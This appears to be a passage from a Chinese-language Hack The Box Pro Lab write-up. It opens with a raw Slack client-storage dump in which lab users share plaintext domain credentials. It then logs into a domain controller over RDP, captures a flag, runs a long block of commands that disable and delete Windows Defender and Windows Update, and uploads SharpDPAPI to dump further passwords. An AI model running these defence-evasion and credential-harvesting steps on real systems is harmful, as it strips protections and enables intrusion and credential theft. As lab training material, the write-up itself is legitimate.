mutedChannelso{ "needsApiMarkingo{ "needsCreatedMessageo"sysadminT{"convertToPrivateChannelo{ {"developerActionso{ "emojio"T01CK1QBDDLo"cacheTs"1560987000.000000"customEmojio"bowtieo"url">https://emoji.slack-edge.com/T01CK1QBDDL/bowtie/f3ec6f2bb0.png{"squirrelo"url"@https://emoji.slack-edge.com/T01CK1QBDDL/squirrel/465f40c0e0.png{"glitch_crabo"url"Chttps://emoji.slack-edge.com/T01CK1QBDDL/glitch_crab/db049f1f9c.png{"piggyo"url"=https://emoji.slack-edge.com/T01CK1QBDDL/piggy/b7762ee8cd.png{"
cubimal_chicko"url"Ehttps://emoji.slack-edge.com/T01CK1QBDDL/cubimal_chick/85961c43d7.png{"dusty_sticko"url"Chttps://emoji.slack-edge.com/T01CK1QBDDL/dusty_stick/6177a62312.png{"slacko"url"=https://emoji.slack-edge.com/T01CK1QBDDL/slack/7d462d2443.png{"prideo"url"=https://emoji.slack-edge.com/T01CK1QBDDL/pride/56b1bd3388.png{"thumbsup_allo"url"Dhttps://emoji.slack-edge.com/T01CK1QBDDL/thumbsup_all/50096a1020.gif{"
slack_callo"url"Bhttps://emoji.slack-edge.com/T01CK1QBDDL/slack_call/b81fffd6dd.png{"simple_smileo"url"Khttps://a.slack-edge.com/80588/img/emoji_2017_12_06/google/simple_smile.png{"shipito"aliasOf"squirrel{"white_squareo"aliasOf"white_large_square{"black_squareo"aliasOf"black_large_square{{{{"environmento{ "externalTeamIdso{ "externalTeamsChannelso{ "extSharedChannelTeamso{ "fileso{ "	idpGroupso{ "membershipCountso"C01CRP755V0o"countso"current_team_member_countI"member_countI"restricted_member_countI "teams_member_count_"member_count_by_teamo"T01CK1QBDDLI{"	app_countI {{"D01CNM69G3Fo"countso"current_team_member_countI"member_countI"restricted_member_countI "teams_member_count_"member_count_by_teamo"T01CK1QBDDLI{"	app_countI {{"D01CXUJNBS8o"countso"current_team_member_countI"member_countI"restricted_member_countI "teams_member_count_"member_count_by_teamo"T01CK1QBDDLI{"	app_countI {{"C01CNNCJELVo"countso"current_team_member_countI"member_countI"restricted_member_countI "teams_member_count_"member_count_by_teamo"T01CK1QBDDLI{"	app_countI {{{"memberso"U01D4CWG7PBo"filesA $  "activityA $  "starsA $  "mentionsA $  "id"U01D4CWG7PB"team_id"T01CK1QBDDL"name"elliot.alterson453646"deletedF"color"4bbe2e"	real_name"elliot alderson"tz"America/Los_Angeles"tz_label"Pacific Daylight Time"	tz_offsetIß‰"profileo"title" "phone" "skype" "	real_name"elliot alderson"real_name_normalized"elliot alderson"display_name"elliot alderson"display_name_normalized"elliot alderson"fieldso{ "status_text" "status_emoji" "status_expirationI "avatar_hash"22b95187ced5"image_original"rhttps://s3-us-west-2.amazonaws.com/slack-files2/avatars/2020-10-16/1439970843764_22b95187ced50a9c1238_original.png"is_custom_imageT"email"elliot.alterson453646@gmail.com"status_text_canonical" "team"T01CK1QBDDL"image_24"Ahttps://ca.slack-edge.com/T01CK1QBDDL-U01D4CWG7PB-22b95187ced5-24"image_32"Ahttps://ca.slack-edge.com/T01CK1QBDDL-U01D4CWG7PB-22b95187ced5-32"image_48"Ahttps://ca.slack-edge.com/T01CK1QBDDL-U01D4CWG7PB-22b95187ced5-48"image_72"Ahttps://ca.slack-edge.com/T01CK1QBDDL-U01D4CWG7PB-22b95187ced5-72"	image_192"Bhttps://ca.slack-edge.com/T01CK1QBDDL-U01D4CWG7PB-22b95187ced5-192"	image_512"Bhttps://ca.slack-edge.com/T01CK1QBDDL-U01D4CWG7PB-22b95187ced5-512"
image_1024"Chttps://ca.slack-edge.com/T01CK1QBDDL-U01D4CWG7PB-22b95187ced5-1024{"is_adminF"is_ownerF"is_primary_ownerF"
is_restrictedF"is_ultra_restrictedF"is_botF"is_app_userF"updatedN   Êlâ×A"is_strangerF"member_color"4bbe2e"is_invited_user_"
isExternalF"	isUnknownF"
isNonExistentF"_name_lc"elliot.alterson453646"_first_name_lc" "
_last_name_lc" "
_real_name_lc"elliot alderson"_real_name_normalized_lc"elliot alderson"_display_name_lc"elliot alderson"_display_name_normalized_lc"elliot alderson"_email_normalized_lc"elliot.alterson453646@gmail.com"is_selfT"manual_presence"active"first_loginN   Ìlâ×A{'"U01CRP74MB4o"filesA $  "activityA $  "starsA $  "mentionsA $  "id"U01CRP74MB4"team_id"T01CK1QBDDL"name"
nigelodea"deletedF"color"9f69e7"	real_name"nigel"tz"
Europe/London"tz_label"British Summer Time"	tz_offsetI 8"profileo"title" "phone" "skype" "	real_name"nigel"real_name_normalized"nigel"display_name" "display_name_normalized" "fieldsA $  "status_text" "status_emoji" "status_expirationI "avatar_hash"g47994160034"email"nigelodea@outlook.com"
first_name"nigel"	last_name" "status_text_canonical" "team"T01CK1QBDDL"image_24"Ahttps://ca.slack-edge.com/T01CK1QBDDL-U01CRP74MB4-g47994160034-24"image_32"Ahttps://ca.slack-edge.com/T01CK1QBDDL-U01CRP74MB4-g47994160034-32"image_48"Ahttps://ca.slack-edge.com/T01CK1QBDDL-U01CRP74MB4-g47994160034-48"image_72"Ahttps://ca.slack-edge.com/T01CK1QBDDL-U01CRP74MB4-g47994160034-72"	image_192"Bhttps://ca.slack-edge.com/T01CK1QBDDL-U01CRP74MB4-g47994160034-192"	image_512"Bhttps://ca.slack-edge.com/T01CK1QBDDL-U01CRP74MB4-g47994160034-512"
image_1024"Chttps://ca.slack-edge.com/T01CK1QBDDL-U01CRP74MB4-g47994160034-1024"is_custom_imageF{"is_adminT"is_ownerT"is_primary_ownerT"
is_restrictedF"is_ultra_restrictedF"is_botF"is_app_userF"updatedN  @mâ×A"is_strangerF"member_color"9f69e7"is_invited_user_"
isExternalF"	isUnknownF"
isNonExistentF"_name_lc"
nigelodea"_first_name_lc"nigel"
_last_name_lc" "
_real_name_lc"nigel"_real_name_normalized_lc"nigel"_display_name_lc" "_display_name_normalized_lc" "_email_normalized_lc"nigelodea@outlook.com{$"	USLACKBOTo"filesA $  "activityA $  "starsA $  "mentionsA $  "id"	USLACKBOT"team_id"T01CK1QBDDL"name"slackbot"deletedF"color"757575"	real_name"Slackbot"tz"America/Los_Angeles"tz_label"Pacific Daylight Time"	tz_offsetIß‰"profileo"title" "phone" "skype" "	real_name"Slackbot"real_name_normalized"Slackbot"display_name"Slackbot"display_name_normalized"Slackbot"fieldso{ "status_text" "status_emoji" "status_expirationI "avatar_hash"sv41d8cd98f0"
always_activeT"
first_name"slackbot"	last_name" "status_text_canonical" "team"T01CK1QBDDL"image_24"?https://ca.slack-edge.com/T01CK1QBDDL-USLACKBOT-sv41d8cd98f0-24"image_32"?https://ca.slack-edge.com/T01CK1QBDDL-USLACKBOT-sv41d8cd98f0-32"image_48"?https://ca.slack-edge.com/T01CK1QBDDL-USLACKBOT-sv41d8cd98f0-48"image_72"?https://ca.slack-edge.com/T01CK1QBDDL-USLACKBOT-sv41d8cd98f0-72"	image_192"@https://ca.slack-edge.com/T01CK1QBDDL-USLACKBOT-sv41d8cd98f0-192"	image_512"@https://ca.slack-edge.com/T01CK1QBDDL-USLACKBOT-sv41d8cd98f0-512"
image_1024"Ahttps://ca.slack-edge.com/T01CK1QBDDL-USLACKBOT-sv41d8cd98f0-1024"is_custom_imageF{"is_adminF"is_ownerF"is_primary_ownerF"
is_restrictedF"is_ultra_restrictedF"is_botF"is_app_userF"updatedN        "is_strangerF"member_color"757575"is_invited_user_"
isExternalF"	isUnknownF"
isNonExistentF"is_slackbotT"_name_lc"slackbot"_first_name_lc"slackbot"
_last_name_lc" "
_real_name_lc"slackbot"_real_name_normalized_lc"slackbot"_display_name_lc"slackbot"_display_name_normalized_lc"slackbot"_email_normalized_lc" {%{"
membershipo"C01CNNCJELVo"U01D4CWG7PBo"isKnownT"isMemberT{"U01CRP74MB4o"isKnownT"isMemberT{{{"membershipOrderedo"C01CRP755V0aI "U01D4CWG7PBI"U01CRP74MB4@"C01CNNCJELVA"U01D4CWG7PB"U01CRP74MB4$ {"messageso"C01CRP755V0o"1602859813.000400o"	thread_ts_"slackbot_feels0"
_hidden_reply_"reply_countI "replies_"latest_reply_"reply_users_"reply_users_count_"files_ ca t t a c h m e n t s _"blocks_"type"message"ts"1602859813.000400"channel"C01CRP755V0"
no_displayF"user"U01D4CWG7PB"_rxn_key"%message-1602859813.000400-C01CRP755V0"subtype"channel_join"text"%<@U01D4CWG7PB> has joined the channel"__meta__o"
lastUpdatedTs"10543.919999999616{{"1602859392.000200o"	thread_ts_"slackbot_feels0"
_hidden_reply_"reply_countI "replies_"latest_reply_"reply_users_"reply_users_count_"files_ca t t a c h m e n t s _"blocks_"type"message"ts"1602859392.000200"channel"C01CRP755V0"
no_displayF"user"U01CRP74MB4"_rxn_key"%message-1602859392.000200-C01CRP755V0"subtype"channel_join"text"%<@U01CRP74MB4> has joined the channel"__meta__o"
lastUpdatedTs"9052.92499999996{{{"D01CNM69G3Fo"1602860278.001500o"	thread_ts_"slackbot_feels0"
_hidden_reply_"reply_countI "replies_"latest_reply_"reply_users_"reply_users_count_"files_ca t t a c h m e n t s _"blocksAo"type"	rich_text"block_id"naE"elementsAo"type"rich_text_section"elementsAo"type"text"text"6local account
username: elliot
password: LetMeInAgain!{$ {$ {$ "
client_msg_id"$51d0ec97-383c-4d57-b4f0-91fc5043216a"source_team_id"T01CK1QBDDL"type"message"ts"1602860278.001500"channel"D01CNM69G3F"
no_displayF"user"U01D4CWG7PB"_rxn_key"%message-1602860278.001500-D01CNM69G3F"subtype_"text"6local account
username: elliot
password: LetMeInAgain!"__meta__o"
lastUpdatedTs"356146.52999999997{{{"C01CNNCJELVo"1602860574.000200o"	thread_ts_"slackbot_feels0"
_hidden_reply_"reply_countI "replies_"latest_reply_"reply_users_"reply_users_count_"files_ca t t a c h m e n t s _"blocks_"type"message"ts"1602860574.000200"channel"C01CNNCJELV"
no_displayF"user"U01D4CWG7PB"_rxn_key"%message-1602860574.000200-C01CNNCJELV"subtype"channel_join"text"%<@U01D4CWG7PB> has joined the channel"__meta__o"
lastUpdatedTs"652826.2549999999{{"1602860583.000400o"	thread_ts_"slackbot_feels0"
_hidden_reply_"reply_countI "replies_"latest_reply_"reply_users_"reply_users_count_"files_ ca t t a c h m e n t s _"blocks_"inviter"U01D4CWG7PB"type"message"ts"1602860583.000400"channel"C01CNNCJELV"
no_displayF"user"U01CRP74MB4"_rxn_key"%message-1602860583.000400-C01CNNCJELV"subtype"channel_join"text"%<@U01CRP74MB4> has joined the channel"__meta__o"
lastUpdatedTs"661588.0499999998{{"1602860614.001000o"	thread_ts_"slackbot_feels0"
_hidden_reply_"reply_countI "replies_"latest_reply_"reply_users_"reply_users_count_"files_ ca t t a c h m e n t s _"blocksAo"type"	rich_text"block_id"2A5q"elementsAo"type"rich_text_section"elementsAo"type"text"text"!MS01 admin account and password:
{$ {o"type"rich_text_preformatted"elementsAo"type"text"text"elliot
LetMeInAgain!{$ {$ {$ "
client_msg_id"$6dac6b1b-cdbb-470d-bac1-25c85be60f55"source_team_id"T01CK1QBDDL"type"message"ts"1602860614.001000"channel"C01CNNCJELV"
no_displayF"user"U01D4CWG7PB"_rxn_key"%message-1602860614.001000-C01CNNCJELV"subtype_"text";MS01 admin account and password:
```elliot
LetMeInAgain!```"__meta__o"
lastUpdatedTs"692706.2700000001{{{{"messagesMetao{ "
notificationso"maxTs"1602860614.001000{"paidFeaturesa @  cr e a c t i o n s o{ "sharedChannelInviteso{ "slashCommando"commandso"/shrugo"autocompleteT"canonical_name"/shrug"desccBA p p e n d s   ¯ \ _ ( Ä0) _ / ¯   t o   y o u r   m e s s a g e "usage"	your text"name"/shrug"type"core"isServerT{"/meo"autocompleteT"canonical_name"/me"usage"your message"desc"Displays action text"name"/me"type"core"isServerT{"/awayo"autocompleteT"canonical_name"/away"usage" "desc c2T o g g l e   y o u r    a w a y    s t a t u s "name"/away"type"core"isServerT{"/whoo"autocompleteT"canonical_name"/who"usage" "desc"!List users in the current channel"name"/who"type"core"isServerT{"	/feedbacko"autocompleteT"canonical_name"	/feedback"usage"
your feedback"desc"Send feedback to the Slack team"name"	/feedback"type"core"isServerT{"/muteo"autocompleteT"canonical_name"/mute"usage"	[channel]"desc"DMutes [channel] or the current channel. Unfollows the current thread"name"/mute"type"core"isServerT{"/remindo"autocompleteT"canonical_name"/remind"usage"$[@someone or #channel] [what] [when]"desc"Set a reminder"name"/remind"type"core"isServerT{"/feedo"autocompleteT"canonical_name"/feed"usagecDh e l p   [ o r   s u b s c r i b e ,   l i s t ,   r e m o v e & ] "desc"Manage RSS subscriptions"name"/feed"type"core"isServerT{"/statuso"autocompleteT"canonical_name"/status"usage">[clear] or [:your_new_status_emoji:] [your new status message]"desc"Set or clear your custom status"name"/status"type"core"isServerT{"/appso"autocompleteT"canonical_name"/apps"usage"
[search term]"desc"*Search for Slack apps in the App Directory"name"/apps"type"core"isServerT{"/activeo"autocompleteT"canonical_name"/active"usage" "desc"Mark yourself as active"name"/active"type"core"isServerT{{"cacheTs"1552014419.000000{"selfTeamIdso"teamId"T01CK1QBDDL{"teamso"T01CK1QBDDLo"id"T01CK1QBDDL"name"Mega Airline"email_domain" "domain"megaairline"msg_edit_window_minsI"prefso"invites_only_adminsF"show_join_leaveF"welcome_place_enabledT"locale"en-US"default_channels^¨" default_channel_creation_enabledT"slackbot_responses_disabledF"
hide_referersT"msg_edit_window_minsI"allow_message_deletionT"
calls_apps^©"allow_callsT"&allow_calls_interactive_screen_sharingT"calls_locations^®"display_real_namesF"who_can_at_everyone"regular"who_can_at_channel"ra"who_can_create_channels"regular"who_can_archive_channels"regular"who_can_create_groups"ra"$who_can_manage_channel_posting_prefs"ra"who_can_post_general"ra"who_can_kick_channels c
a d m i n "who_can_kick_groups"regular" admin_customized_quick_reactions^¯"workflow_builder_enabledT"who_can_view_message_activity^°"member_analytics_disabledF"$workflow_extension_steps_beta_opt_inF"channel_email_addresses_enabledT"retention_typeI "retention_durationI "group_retention_typeI "group_retention_durationI "dm_retention_typeI "dm_retention_durationI "file_retention_typeI "file_retention_durationI "allow_retention_overrideF"allow_admin_retention_overrideI "default_rxns^²"compliance_export_startI "warn_before_at_channel"always"disallow_public_file_urlsF"!who_can_create_delete_user_groups c
a d m i n "who_can_edit_user_groupsc
a d m i n "who_can_change_team_profile c
a d m i n "subteams_auto_create_ownerF"subteams_auto_create_adminF"display_email_addressesT" display_external_email_addressesT"discoverable"unlisted"dnd_days"	every_day"invite_requests_enabledT"disable_file_uploads"	allow_all"disable_file_editingF"disable_file_deletingF"file_limit_whitelistedF"%uses_customized_custom_status_presetsF"disable_email_ingestionF"who_can_manage_guests^³"who_can_create_shared_channels c
a d m i n "who_can_manage_shared_channels^µ"who_can_post_in_shared_channels^·""who_can_manage_ext_shared_channels^¹"gdrive_enabled_teamF"dropbox_legacy_pickerF"box_app_installedF"onedrive_app_installedF"onedrive_enabled_teamF"filepicker_app_first_installF"use_browser_pickerF"#can_receive_shared_channels_invitesT"1external_shared_channel_requests_approval_channel0"/received_esc_route_to_channel_awareness_messageF"#who_can_request_ext_shared_channels^»"enterprise_default_channels^½" enterprise_has_corporate_exportsF"enterprise_mandatory_channels^¾"$enterprise_mdm_disable_file_downloadF""mobile_passcode_timeout_in_secondsI"notification_redaction_type"REDACT_ALL_CONTENT"has_compliance_exportF"has_hipaa_complianceF"all_users_can_purchaseT"self_serve_selectF"loud_channel_mentions_limitI œ"enable_shared_channelsI"who_can_manage_public_channels^¿"who_can_manage_private_channels^Â"2who_can_manage_private_channels_at_workspace_level^Å"enable_connect_dm_early_accessF"enterprise_mobile_device_checkF"required_minimum_mobile_version0"enable_info_barriersF")enable_mpdm_to_private_channel_conversionT"
gg_enabledF"created_with_googleF"has_seen_partner_promoF"disable_sidebar_connect_prompts^È"disable_sidebar_install_prompts^É"block_file_downloadF"single_user_exportsF"app_management_apps^Ê"custom_contact_email0"ent_required_browser0"dev_company_segment0"org_calls_apps0"ntlm_credential_domains"*"rimeto_org_instance_id0"dnd_enabledT"dnd_start_hour"22:00"dnd_end_hour"08:00"dnd_before_monday"08:00"dnd_after_monday"22:00"dnd_before_tuesday"08:00"dnd_after_tuesday"22:00"dnd_before_wednesday"08:00"dnd_after_wednesday"22:00"dnd_before_thursday"08:00"dnd_after_thursday"22:00"dnd_before_friday"08:00"dnd_after_friday"22:00"dnd_before_saturday"08:00"dnd_after_saturday"22:00"dnd_before_sunday"08:00"dnd_after_sunday"22:00"dnd_enabled_monday"partial"dnd_enabled_tuesday"partial"dnd_enabled_wednesday"partial"dnd_enabled_thursday"partial"dnd_enabled_friday"partial"dnd_enabled_saturday"partial"dnd_enabled_sunday"partial"dnd_weekdays_off_alldayF"custom_status_presetsAA":spiral_calendar_pad:"In einem Meeting"In a meeting"1_hour$ A":bus:"	Unterwegs"	Commuting"
30_minutes$ A":face_with_thermometer:"Krank"Out sick"all_day$ A":palm_tree:"	Im Urlaub"Vacationing"
no_expiration$ A":house_with_garden:"Home-Office"Working remotely"all_day$ $ "custom_status_default_emoji":speech_balloon:"	auth_mode"normal"who_can_manage_integrations^Ñ"app_whitelist_enabledF"who_can_create_workflows^Ó"!workflows_webhook_trigger_enabledT" workflow_extension_steps_enabledT"workflows_export_csv_enabledT"&who_can_create_channel_email_addresses^Õ"who_can_dm_anyone^×"
invites_limitT{“"icono"image_34"@https://a.slack-edge.com/80588/img/avatars-teams/ava_0012-34.png"image_44"@https://a.slack-edge.com/80588/img/avatars-teams/ava_0012-44.png"image_68"@https://a.slack-edge.com/80588/img/avatars-teams/ava_0012-68.png"image_88"@https://a.slack-edge.com/80588/img/avatars-teams/ava_0012-88.png"	image_102"Ahttps://a.slack-edge.com/80588/img/avatars-teams/ava_0012-102.png"	image_132"Ahttps://a.slack-edge.com/80588/img/avatars-teams/ava_0012-132.png"	image_230"Ahttps://a.slack-edge.com/80588/img/avatars-teams/ava_0012-230.png"
image_defaultT{"over_storage_limitF"messages_countI "plan" "onboarding_channel_id"C01CRP755V0"date_createN  €]lâ×A"limit_tsI "avatar_base_url"https://ca.slack-edge.com/"	isUnknownF"
isNonExistentF"is_migratingF"profileo"fieldsa @  {"_other_accountF{{"
userGroupso{ "userGroupMembershipo{ "orgAppsSearchWorkspaceo"selectedWorkspacesa @  "excludedWorkspacesa @  "
workspacesa @  "	isLoadingF"apiTotal_"	apiParamso"query_"sortDir"asc"sort"name"cursor_"app_"limitIÈ"mode" {"modalSuccess_{"tspEmailDeliveryo"
inputEmail" "selectedUserIdI "selectedEmailLogsa @  "selectedUsersInfoo{ "usersInfoTableHeight"0px"emailLogsTableHeight"0px{"mcCallV2o{ "
setupCreationo"currentStep"TeamName"teamName" "activeTaskso{ "channelItemsa @  "emailsa @  "skippedChannelsF"skippedInvitesF"sharedInviteLink0{"sharedChannelContento"contentType"control{"inviteToWorkspaceo"campaign"	team_menu"currentInviteLink0"currentView"INVITE_FORM"customGuestExpirationDate" "
customMessage" "	formError0"hasInvalidEmailInputT"
inviteType"regular"
isLongRequestF"isSubmittingInvitesF"processedInvitesa @  "reasonForRequest" "selectedChannelOptionsa @  "selectedGuestExpirationOption0"tokenizedInvitesa @  "unprocessedInvitesa @  {"slackbotResponseso"slackbotResponsesa @  "
nextCursor0{"routeo"	routeName"ROUTE_ENTITY"paramso"teamId"T01CK1QBDDL"entityId"C01CNNCJELV{"userNavigatedDuringWarmBootF{"persistenceHasheso"activity" 4f95d209360f10059dac35ba2b042759"
activityFocus" 4b9c55b91c356acdeb67759d74d1b338"adminInvites" e7641abdce62832c251b15e216705226"
allThreads" 25ecf9b9a976d4ee1e8fe06fcf609930"
allUnreads" aa8d81d4d9b2593b2e289e54f35ac12f"appsInChannels" 61e1f2efbcb19b13f411b8a137402ccf"approvedExternalTeams" 16f3a293dc0c0c59e07c83cf3d76f160"bootData" dde1cf6f8e4ecefb9e481e99be1ab6becb r o w s e r s " 6e784445b6355a2e01b0d5da65ee7a7c"canInteract" 062c82112e90109ed46f0be91052e936"channelSidebar" 66ac360fe3beb7b827cfd62751d7d900"channelSections" 0d0a1c1b7fb27ca0d7976725178dee0d"channelPrefixes" 4c6e6649a74591e95a91b7e1233ef84a"checkoutFlow" 682b7fa444ac67727149d8ab16dfa887"consistency" c5177098175817921bf9c82a80dfb732"customEmoji" 4893f4ea12f8c073098c3c733c8e36aa"drafts" d2f915355feb40a675d890296f53673a"draftsExpansion" 16f3a293dc0c0c59e07c83cf3d76f160"draftUnfurls" 49d6fac84af7dc3e6dcf82b5138f4a87"
ekmChanges" 742f51d5ecfc41ec28d1cd0d18e0e959"emailDrafts" 5cb3f13fab30b77a003ddeab6e3f8bae"emailRender" b315c239f79d7169dc13d0bc41c3af7a"emailReplyDrafts" 30030885e61d2d90b3629db279417d54"expandables" 16f3a293dc0c0c59e07c83cf3d76f160"experiments" 8a9470e6477e26114523cb62e4163062"fileRefresh" 01a5763510d851040af71d5550a9aeae"
filesFlexpane" 5f8fcd3deddb8d80320852d9ee64bcec"	endpoints" 1a6c4b5368071240d3aeadbd01bd5fcb ch e l p " 02da810913fe167f99fd5afd59af5086"imports" e6e3aab1b44500ca0777b9fc57fb1001"inbox" 5c8219e3795a90a9ac6e02e2377fa1bb"inlineFilePreviews" c5779e0a83fb334b06fedf0745bd8eb8"invites" de4abd7173b133850292e713d10a9edd"lastUsedSlashCommand" 05b04753b2961dbf47a2e8dafa754052"links" f4c1b2a1982d565d0e9e2e9e3436903f"memberDirectoryFlexpane" e237033c7c63b8c43327d94534ac33a8"messageEdit" ff63171cc70b76d6af68bd70d0cb11d2"messagePane" ce423db1ace07695ed286336227c00b8"modal" 9aac9f1dee0bd4be0a0090399c51b687"pendingOpenChannel" 0558b887a49688233ac6dc31257b8260"persistedApiCalls" dde1cf6f8e4ecefb9e481e99be1ab6be"prefs" 851cf6f9097c19c23facf0612cb851a7"pricingPlans" 308b1ec2d5e35dcc77921ab46560bc47"roles" 40715f1736eaa62ba8fe4ab65d3b5a93"
savedFocus" 4b9c55b91c356acdeb67759d74d1b338"searchAutocomplete" edff0a3436ca0f8bbe297c528a732f99"searchChannelsUsers" 8972a744a9830f0a43a70fd7342073ac"searchInputBox" 5b894d2c5356d10588a7fcc24e7e4beb"
searchResults" 9a5742556051fda69fea46b71bcc1a2e"
searchSession" 83efe2065173b815414ec73a79b9551c"searchUi" b0573395d0e02515ca249e8a81fa095d"stars" d9e8472f4d218292404096f190d4c1b5"pins" 39e095c33b75f9ced56fba9cf571468d"threadsFlexpane" 992587d421a7c796058f965cc5192efc"	threadSub" 2aac3e7948084cd56d4ca738861caaf5"uiSerialization" ad99bb7ae5604973ed110d9ffa469ae0"unfurls" 84c974069283fd6ff06d4f7738a25b87"unreadCounts" 1c16478137757050f24e862d30aa3f06"userGroupsFlexpane" 48807b27cc398c7720cde742a591620f"usersCounts" 473495ed15d802538eeb8d59e0684da9"	workspace" 4ed2cc6a00b972b6da66bd951d00d513"enablePopupsBanner" 9130ec9a81f6a524ff81ac1e9b5efa2b"whatsNew" 1c621e3688d767f417adbb3ed175ee2f"recentlySharedFilesPicker" 87dc987c91c382bcac40def6ae39f5b1"channelBrowser" 143c8706533bfad3e8ab977619f0b4f7"siwsDomains" c3b7dfba88f6671067fd2cf5af4d52b5"
appActions" 88ce1b2b31e52f28243127c6da73cf4d"appGlobalActions" 50d5237126afee978985aab4fc2b7f3b"
shortcutsMenu" 7e161048e8a8c3ea78200a0ff10f4458"channelActions" af3bf7b8e8c94ebdf2b7b11bf0add8b3"appHomes" 31db5048094d24d74844ba5840b252b6"appPermissions" 5e6b10e2b89baf9f78b8098872ae4e7b"appProfiles" b87cc0822854b1e4858d1993e055fa26"appViews" 02ca53e2dc0fe9dc3a8f6cf62fb28e18"appCollaborators" f3e8f04df269d6d97c8b382aecba12ff"apps" 6e1baad49aa2dad15ff0b596d3859df8"blocks" dde1cf6f8e4ecefb9e481e99be1ab6be"bots" 730b64d13d50793c4c8b34df4bf7bba0"botsMetadata" 2a5d0c19e2524e2c24e8393b627b2c8c"channelHistory" 9ab9fbcdce05d90b0be1b31e9202dbbf"channels" 730b64d13d50793c4c8b34df4bf7bba0"channelsMeta" 2a63562a2fa5c36f09d9b1ba9d7f2ca3"developerActions" fd1e7f40a5c8b376b08f42cd566ca50f"emoji" ea3a33ed74be895bb7e4c91a8dc31811"environment" 1f090f6f302c4977d54b6658cdac3ee1"externalTeamIds" 2399bf83daadf75e94c8f2f2111c1aa3"externalTeamsChannels" 3a377dc758eb072d6073d9d8c16b5399"extSharedChannelTeams" f15c051c9c3383e5bb3731c125fa7eb8"files" e9c1df2dcb51b6ab629bd8caa84ab269"	idpGroups" 7146ec976535ecae5a7aba165adace08"membershipCounts" 2d14f26394a55d246493b424f94dee2d"members" 730b64d13d50793c4c8b34df4bf7bba0"
membership" 8d010061c4790931b80d76cc991b8c08"membershipOrdered" ab55663e009af00aab530614e0d65877"messages" fc2ff5dc620ac0252bef006b3a5ac8e0"messagesMeta" 8d010061c4790931b80d76cc991b8c08"
notifications" 7e422ac51c7125814db640a856b4e4e1"paidFeatures" 1deae2669dab00f9ea2f90aa08ba2bfb cr e a c t i o n s " 3615718bed41cc6c944195427397ca34"sharedChannelInvites" 3db400d90c4ddaa03b9275b26e02526a"slashCommand" e6a139e8da485433187864554286f782"selfTeamIds" ccfbc397bfca32ad60e8e0f3d50240f4"teams" eeaff54572044335d9a805efeea82dcb"
userGroups" 7c097dec14b94571fb71fd9191e81c87"userGroupMembership" d7ff7b9f35c1f3adda9cec245bea23da"customStatus" 6104939a69f2149fa0c866c6cd0f8b74"orgAppsSearchWorkspace" bc759a7a4cc6a4943e06a80e27208875"tspEmailDelivery" 1717c529db9218f0c7a46f48d660bd92"mcCallV2" 3a84a8ed8d330762a92e1090942c8d5f"
setupCreation" b8f72340bd9301f1d87427a1ede23848"	reinvited" 6c8e97947a04dbdb1ff3feaaad8bb7d7"sharedChannelContent" 5b819bedcb84eb4466c9b7a02a82a947"inviteToWorkspace" 57f3bf2fdf8e0bfa1b04e9a34620dafc"route" b93c612f67a3410ac548a03e5126945f"persistenceHashes" dde1cf6f8e4ecefb9e481e99be1ab6be{s{o
```

## rdp登录
> 在DC01中通过凭据megaairline\elliot  密码LetMeInAgain!
>

![](/image/hackthebox-prolabs/Ascension-15.png)

## Getflag
```bash
ASCENSION{sL4ck1ng_0n_enCrypt1oN}
```

![](/image/hackthebox-prolabs/Ascension-16.png)

## 关闭防护
```bash
sc stop WinDefend
sc config WinDefend start= disabled
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -DisableIOAVProtection $true"
powershell -Command "Set-MpPreference -DisableScriptScanning $true"
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\Users\Public'"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "ForceUpdateFromMU" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter" /v "HideWindowsSecurityNotificationAreaControl" /t REG_DWORD /d 1 /f
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled
Stop-Service -Name WdNisSvc -Force
Set-Service -Name WdNisSvc -StartupType Disabled
Stop-Service -Name wscsvc -Force
Set-Service -Name wscsvc -StartupType Disabled
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f
icacls "C:\Program Files\Windows Defender" /grant Administrators:F /t
rmdir /s /q "C:\Program Files\Windows Defender"
icacls "C:\ProgramData\Microsoft\Windows Defender" /grant Administrators:F /t
rmdir /s /q "C:\ProgramData\Microsoft\Windows Defender"
```

## SharpDpapi&Sharphound&mimikatz
### 上传<font style="color:rgb(107, 107, 107);">SharpDpapi&psexec&-DC01</font>
```bash
upload /home/kali/Desktop/tools/WindowsBinaries-master/SharpDPAPIv1.11.1.exe
```

### MS01下载
![](/image/hackthebox-prolabs/Ascension-17.png)

### SharpDPAPI运行
> 以管理员运行cmd，绕过UAC限制 得到凭据MS01\Administrator 密码FWErfsgt4ghd7f6dwx
>

```bash
C:\Users\elliot.MS01\Downloads>SharpDPAPIv1.11.1.exe machinetriage

  __                 _   _       _ ___
